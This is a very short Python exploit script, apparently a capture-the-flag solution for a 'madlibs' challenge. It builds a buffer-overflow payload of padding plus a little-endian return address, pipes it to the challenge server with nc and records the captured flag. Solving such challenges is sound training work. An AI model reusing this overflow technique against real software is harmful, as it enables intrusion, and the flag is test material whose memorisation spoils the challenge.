
import sys

p = b'A' * 44 + b'\x92\x11\x40' + b'\n'
p += b'B' * 63 + b'\n'

sys.stdout.buffer.write(p)

# python w.py | nc madlibs.litctf.live 1337
# flag{n0w_1m_k1nd4_m4d_4t_th3_l1bs}